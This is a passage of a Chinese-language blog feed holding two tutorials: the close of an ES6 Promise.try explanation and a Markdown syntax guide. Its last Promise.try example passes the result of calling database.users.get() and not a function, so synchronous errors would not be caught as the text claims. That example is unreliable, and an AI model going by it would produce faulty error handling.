函数<code>g</code>之中，有一个异步操作<code>getFoo</code>，它返回的就是一个<code>Promise</code>对象。函数<code>run</code>用来处理这个<code>Promise</code>对象，并调用下一个<code>next</code>方法。</p><h2 id="Promise-try"><a href="#Promise-try" class="headerlink" title="Promise.try()"></a>Promise.try()</h2><p>实际开发中，经常遇到一种情况：不知道或者不想区分，函数<code>f</code>是同步函数还是异步操作，但是想用 Promise 来处理它。因为这样就可以不管<code>f</code>是否包含异步操作，都用<code>then</code>方法指定下一步流程，用<code>catch</code>方法处理<code>f</code>抛出的错误。一般就会采用下面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve().then(f)</span><br></pre></td></tr></table></figure><p>上面的写法有一个缺点，就是如果<code>f</code>是同步函数，那么它会在本轮事件循环的末尾执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// next</span></span><br><span class="line"><span class="comment">// now</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>f</code>是同步的，但是用 Promise 包装了以后，就变成异步执行了。</p><p>那么有没有一种方法，让同步函数同步执行，异步函数异步执行，并且让它们具有统一的 API 呢？回答是可以的，并且还有两种写法。第一种写法是用<code>async</code>函数来写。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; f())();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>上面代码中，第二行是一个立即执行的匿名函数，会立即执行里面的<code>async</code>函数，因此如果<code>f</code>是同步的，就会得到同步的结果；如果<code>f</code>是异步的，就可以用<code>then</code>指定下一步，就像下面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; f())()</span><br><span class="line">.then(...)</span><br></pre></td></tr></table></figure><p>需要注意的是，<code>async () =&gt; f()</code>会吃掉<code>f()</code>抛出的错误。所以，如果想捕获错误，要使用<code>promise.catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; f())()</span><br><span class="line">.then(...)</span><br><span class="line">.catch(...)</span><br></pre></td></tr></table></figure><p>第二种写法是使用<code>new Promise()</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line">(</span><br><span class="line">  () =&gt; <span class="keyword">new</span> <span class="built_in">Promise</span>(</span><br><span class="line">    resolve =&gt; resolve(f())</span><br><span class="line">  )</span><br><span class="line">)();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>上面代码也是使用立即执行的匿名函数，执行<code>new Promise()</code>。这种情况下，同步函数也是同步执行的。</p><p>鉴于这是一个很常见的需求，所以现在有一个<a href="https://github.com/ljharb/proposal-promise-try" target="_blank" rel="noopener">提案</a>，提供<code>Promise.try</code>方法替代上面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line"><span class="built_in">Promise</span>.try(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>事实上，<code>Promise.try</code>存在已久，Promise 库<a href="http://bluebirdjs.com/docs/api/promise.try.html" target="_blank" rel="noopener"><code>Bluebird</code></a>、<a href="https://github.com/kriskowal/q/wiki/API-Reference#promisefcallargs" target="_blank" rel="noopener"><code>Q</code></a>和<a href="https://github.com/cujojs/when/blob/master/docs/api.md#whentry" target="_blank" rel="noopener"><code>when</code></a>，早就提供了这个方法。</p><p>由于<code>Promise.try</code>为所有操作提供了统一的处理机制，所以如果想用<code>then</code>方法管理流程，最好都用<code>Promise.try</code>包装一下。这样有<a href="http://cryto.net/~joepie91/blog/2016/05/11/what-is-promise-try-and-why-does-it-matter/" target="_blank" rel="noopener">许多好处</a>，其中一点就是可以更好地管理异常。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params">userId</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> database.users.get(&#123;<span class="attr">id</span>: userId&#125;)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> user.name;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>database.users.get()</code>返回一个 Promise 对象，如果抛出异步错误，可以用<code>catch</code>方法捕获，就像下面这样写。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database.users.get(&#123;<span class="attr">id</span>: userId&#125;)</span><br><span class="line">.then(...)</span><br><span class="line">.catch(...)</span><br></pre></td></tr></table></figure><p>但是<code>database.users.get()</code>可能还会抛出同步错误（比如数据库连接错误，具体要看实现方法），这时你就不得不用<code>try...catch</code>去捕获。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  database.users.get(&#123;<span class="attr">id</span>: userId&#125;)</span><br><span class="line">  .then(...)</span><br><span class="line">  .catch(...)</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这样的写法就很笨拙了，这时就可以统一用<code>promise.catch()</code>捕获所有同步和异步的错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.try(database.users.get(&#123;<span class="attr">id</span>: userId&#125;))</span><br><span class="line">  .then(...)</span><br><span class="line">  .catch(...)</span><br></pre></td></tr></table></figure><p>事实上，<code>Promise.try</code>就是模拟<code>try</code>代码块，就像<code>promise.catch</code>模拟的是<code>catch</code>代码块。</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  ES6 Promise对象讲解及其用法！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="javascript" scheme="https://jiuylq.github.io/categories/javascript/"/>
    
    
      <category term="ES6" scheme="https://jiuylq.github.io/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>markdown-guide</title>
    <link href="https://jiuylq.github.io/2017/11/05/markdown-guide/"/>
    <id>https://jiuylq.github.io/2017/11/05/markdown-guide/</id>
    <published>2017-11-05T14:41:34.000Z</published>
    <updated>2017-11-05T16:38:01.118Z</updated>
    
    <content type="html"><![CDATA[<p>Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="Markdown简介"><a href="#Markdown简介" class="headerlink" title="Markdown简介"></a>Markdown简介</h2><p>Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。这个教程可以让使用 Markdown 的新手快速熟悉语法和快捷键。本文基于 Ghost 的 Markdown 指南，兼容标准版 Markdown 编辑器和 Github Flavored Markdown。</p><p>NOTE: 虽然 Markdown 标记语言不能够实现 HTML 语法上的全部功能，但你可以混合使用 HTML 和 Markdown 语法。此页提供 Markdown 的简单入门指南，而 语法说明 页提供了详细的文档。</p><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">或</span><br><span class="line">这是一个一级标题</span><br><span class="line">============================</span><br><span class="line">这是一个二级标题</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure><p><em>注：# 和「标题」之间建议保留一个字符的空格，这是最标准的 Markdown 写法。</em></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><blockquote><p>无序列表  </p></blockquote><p>无序列表是使用*,+,-中任意一种来表示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* 文本1</span><br><span class="line">* 文本2</span><br><span class="line">* 文本3</span><br><span class="line">或</span><br><span class="line">+ 文本1</span><br><span class="line">+ 文本2</span><br><span class="line">+ 文本3</span><br><span class="line">或</span><br><span class="line">- 文本1</span><br><span class="line">- 文本2</span><br><span class="line">- 文本3</span><br></pre></td></tr></table></figure></p><blockquote><p>有序列表 </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 文本1</span><br><span class="line">2. 文本2</span><br><span class="line">3. 文本3</span><br></pre></td></tr></table></figure><p><em>注：-、1.和文本之间要保留一个字符的空格。</em></p><h3 id="链接和图片"><a href="#链接和图片" class="headerlink" title="链接和图片"></a>链接和图片</h3><blockquote><p>链接</p></blockquote><ul><li>行内式<br>在 Markdown 中，插入链接不需要其他按钮，你只需要使用 <a href="链接地址">显示文本</a> 这样的语法即可，例如：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[title](url &quot;描述&quot;)</span><br><span class="line">[hexo](https://hexo.io)</span><br></pre></td></tr></table></figure><p><a href="https://hexo.io" title="hexo" target="_blank" rel="noopener">hexo</a></p><ul><li>参考式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[title][id]</span><br><span class="line">  标记: [id]: https://www.baidu.com/ &quot;度娘&quot;</span><br><span class="line">  或者: [id]: https://www.baidu.com/ &apos;度娘&apos; (简书不支持)</span><br><span class="line">  或者 [id]: https://www.baidu.com/ (度娘)</span><br></pre></td></tr></table></figure></li></ul><p>[title][121]<br>[121]: <a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a> “度娘”</p><ul><li>隐式链接标记功能<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Baidu][]</span><br><span class="line">  标记可以这样写: [Baidu]: http://baidu.com</span><br></pre></td></tr></table></figure></li></ul><p><a href="http://baidu.com" target="_blank" rel="noopener">Baidu</a></p><ul><li>参考式链接范例:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">I get 10 times more traffic from [Google] [1] than from </span><br><span class="line">     [Yahoo] [2] or [MSN] [3]. </span><br><span class="line">     [1]:  http://google.com/        &quot;Google&quot;</span><br><span class="line">     [2]: http://search.yahoo.com/  &quot;Yahoo Search&quot;</span><br><span class="line">     [3]: http://search.msn.com/    &quot;MSN Search&quot;</span><br><span class="line">     I get 10 times more traffic from [Google][] than from</span><br><span class="line">     [Yahoo][] or [MSN][].</span><br><span class="line">     [google]: http://google.com/        &quot;Google&quot;</span><br><span class="line">     [yahoo]:  http://search.yahoo.com/  &quot;Yahoo Search&quot;</span><br><span class="line">     [msn]:    http://search.msn.com/    &quot;MSN Search&quot;</span><br></pre></td></tr></table></figure><ul><li>自动链接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">示例如下: </span><br><span class="line">  &lt;http:\\www.baidu.com&gt;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>图片</p></blockquote><p>在 Markdown 中，插入图片不需要其他按钮，你只需要使用 <img src="/2017/11/05/markdown-guide/图片链接地址" alt> 这样的语法即可，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">![图片Alt](图片地址 “图片Title”)</span><br><span class="line">![title](https://hexo.io/img/a.jpg)</span><br><span class="line">![title](https://hexo.io/img/a.jpg &quot;描述&quot;)</span><br><span class="line">或</span><br><span class="line">![title][1]</span><br><span class="line">[1]: https://hexo.io/img/a.jpg &quot;描述&quot;</span><br></pre></td></tr></table></figure><p><em>注：插入图片的语法和链接的语法很像，只是前面多了一个 ！。</em></p><h3 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h3><blockquote><p>Markdown使用性星号(<em>)和底线(_)作为标记强调字词的符号<br>两端被一个</em>或<em>包围的单词会被转换成斜体<br>两端被两个<code>*</code>或`</em><code>包围的单词会被转换成粗体</code>*`或_的两端不能有空白<br>用什么符号就以什么符号结尾</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例</span><br><span class="line">*斜体*</span><br><span class="line">_斜体_</span><br><span class="line">**粗体**</span><br><span class="line">__粗体__</span><br><span class="line">***加粗斜体***</span><br><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><p>  <em>斜体</em><br> _斜体_<br> <strong>粗体</strong><br> <strong>粗体</strong><br> <strong><em>加粗斜体</em></strong><br> <del>删除线</del></p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote><p>在我们写作的时候经常需要引用他人的文字，这个时候引用这个格式就很有必要了，在 Markdown 中，你只需要在你希望引用的文字前面加上 &gt; 就好了，例如：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; 简单引用1</span><br><span class="line"> &gt; 简单引用2</span><br><span class="line"> &gt; </span><br><span class="line"> &gt; 多行引用</span><br><span class="line"> &gt;&gt; 嵌套引用</span><br><span class="line"></span><br><span class="line"> &gt; ## 引用中使用Markdown语法。</span><br><span class="line"> &gt; </span><br><span class="line"> &gt; 1.   这是第一行列表项。</span><br><span class="line"> &gt; 2.   这是第二行列表项。</span><br><span class="line"> &gt; </span><br><span class="line"> &gt; 给出一些例子代码：</span><br><span class="line"> &gt; </span><br><span class="line"> &gt;     return shell_exec(&quot;echo $input | $markdown_script&quot;);</span><br></pre></td></tr></table></figure><blockquote><p>简单引用1<br>简单引用2</p><p>多行引用</p><blockquote><p>嵌套引用</p></blockquote></blockquote><blockquote><p> 引用中使用Markdown语法。</p><ol><li>这是第一行列表项。</li><li>这是第二行列表项。</li></ol><p>给出一些例子代码：</p><pre><code>return shell_exec(&quot;echo $input | $markdown_script&quot;);</code></pre></blockquote><h3 id="代码引用"><a href="#代码引用" class="headerlink" title="代码引用"></a>代码引用</h3><blockquote><p>需要引用代码时，如果引用的语句只有一段，不分行，可以用`将语句包起来。<br>如果引用的语句为多行，可以将```置于这段代码的首行和末行。</p></blockquote><h3 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h3><blockquote><p>一行中用三个以上的星号、减号、底线来建立一个分隔线,行内不能有其他东西,<br>也可以在星号或是减号中间插入空格</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- - -</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">***</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * *</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">——————————————</span><br></pre></td></tr></table></figure><p>——————————————</p><h3 id="段落和换行"><a href="#段落和换行" class="headerlink" title="段落和换行"></a>段落和换行</h3><blockquote><p>段落</p></blockquote><p>段落是由一个或多个连续的文本行组成,<br>它的前后要一个以上的空行(显示上看起来像是空的)</p><blockquote><p>换行</p></blockquote><p>Mardown允许段落内的强迫换行(插入换行符)<br>要依赖Markdown来插入<code>&lt;br/&gt;</code>标签的话,在<code>&lt;br/&gt;</code>插入处要先按入两个以上的空格然后回车</p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><blockquote><p>居中</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> Tables        | Are           | Cool  </span><br><span class="line">:------------: |:-------------:|:-----:</span><br><span class="line"> col 3 is      | right-aligned | $1600 </span><br><span class="line"> col 2 is      | centered      |   $12 </span><br><span class="line"> zebra stripes | are neat      |    $1 </span><br><span class="line">或</span><br><span class="line">| Tables        | Are           | Cool  |</span><br><span class="line">| ------------- |:-------------:| -----:|</span><br><span class="line">| col 3 is      | right-aligned | $1600 |</span><br><span class="line">| col 2 is      | centered      |   $12 |</span><br><span class="line">| zebra stripes | are neat      |    $1 |</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">Tables</th><th style="text-align:center">Are</th><th style="text-align:center">Cool  </th></tr></thead><tbody><tr><td style="text-align:center"> col 3 is</td><td style="text-align:center">right-aligned</td><td style="text-align:center">$1600 </td></tr><tr><td style="text-align:center"> col 2 is</td><td style="text-align:center">centered</td><td style="text-align:center">$12 </td></tr><tr><td style="text-align:center"> zebra stripes</td><td style="text-align:center">are neat</td><td style="text-align:center">$1 </td></tr></tbody></table><blockquote><p>不居中</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dog | bird | cat</span><br><span class="line">----|------|----</span><br><span class="line">foo | foo  | foo</span><br><span class="line">bar | bar  | bar</span><br><span class="line">baz | baz  | baz</span><br></pre></td></tr></table></figure><table><thead><tr><th>dog</th><th>bird</th><th>cat</th></tr></thead><tbody><tr><td>foo</td><td>foo</td><td>foo</td></tr><tr><td>bar</td><td>bar</td><td>bar</td></tr><tr><td>baz</td><td>baz</td><td>baz</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1、简单方式写表格：</span><br><span class="line"></span><br><span class="line">学号|姓名|分数</span><br><span class="line">-|-|-</span><br><span class="line">小明|男|75</span><br><span class="line">小红|女|79</span><br><span class="line">小陆|男|92</span><br><span class="line"></span><br><span class="line">2、原生方式写表格：</span><br><span class="line"></span><br><span class="line">|学号|姓名|分数|</span><br><span class="line">|-|-|-|</span><br><span class="line">|小明|男|75|</span><br><span class="line">|小红|女|79|</span><br><span class="line">|小陆|男|92|</span><br><span class="line"></span><br><span class="line">3、为表格第二列指定方向：</span><br><span class="line"></span><br><span class="line">产品|价格</span><br><span class="line">-|-:</span><br><span class="line">Leanote 高级账号|60元/年</span><br><span class="line">Leanote 超级账号|120元/年</span><br></pre></td></tr></table></figure><p>1、简单方式写表格：</p><table><thead><tr><th>学号</th><th>姓名</th><th>分数</th></tr></thead><tbody><tr><td>小明</td><td>男</td><td>75</td></tr><tr><td>小红</td><td>女</td><td>79</td></tr><tr><td>小陆</td><td>男</td><td>92</td></tr></tbody></table><p>2、原生方式写表格：</p><table><thead><tr><th>学号</th><th>姓名</th><th>分数</th></tr></thead><tbody><tr><td>小明</td><td>男</td><td>75</td></tr><tr><td>小红</td><td>女</td><td>79</td></tr><tr><td>小陆</td><td>男</td><td>92</td></tr></tbody></table><p>3、为表格第二列指定方向：</p><table><thead><tr><th>产品</th><th style="text-align:right">价格</th></tr></thead><tbody><tr><td>Leanote 高级账号</td><td style="text-align:right">60元/年</td></tr><tr><td>Leanote 超级账号</td><td style="text-align:right">120元/年</td></tr></tbody></table><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><blockquote><p>使用反斜杠来插入一些在语法中有其它意义的符号,如*<br>需要转义的字符:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line">*   星号</span><br><span class="line">_   底线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  括弧</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line">-   减号</span><br><span class="line">.   英文句点</span><br><span class="line">!   惊叹号</span><br></pre></td></tr></table></figure><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><p>网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。<br>注意： </p><ol><li>Markdown Extra 只支持在标题后插入锚点，其它地方无效。 </li><li>Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## 0. 目录&#123;#index&#125;</span><br><span class="line">跳转到[目录](#index)</span><br></pre></td></tr></table></figure><h3 id="注脚"><a href="#注脚" class="headerlink" title="注脚"></a>注脚</h3><blockquote><p>在需要添加注脚的文字后加上脚注名字[^注脚名字],称为加注。 然后在文本的任意位置(一般在最后)添加脚注，脚注前必须有对应的脚注名字。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用 Markdown[^1]可以效率的书写文档, 直接转换成 HTML[^2] ,你可以使用 Leanote[^Le] 编辑器进行书写。</span><br><span class="line">[^1]:Markdown是一种纯文本标记语言</span><br><span class="line">[^2]:HyperText Markup Language 超文本标记语言</span><br><span class="line">[^Le]:开源笔记平台，支持Markdown和笔记直接发为博文</span><br></pre></td></tr></table></figure><p>使用 Markdown<a href="Markdown是一种纯文本标记语言">^1</a>可以效率的书写文档, 直接转换成 HTML<a href="HyperTextMarkupLanguage超文本标记语言">^2</a> ,你可以使用 Leanote<a href="开源笔记平台，支持Markdown和笔记直接发为博文">^Le</a> 编辑器进行书写。</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Markdown" scheme="https://jiuylq.github.io/categories/Markdown/"/>
    
    
      <category term="Markdown" scheme="https://jiuylq.github.io/tags/Markdown/"/>
    
  </entry>
  
</feed>
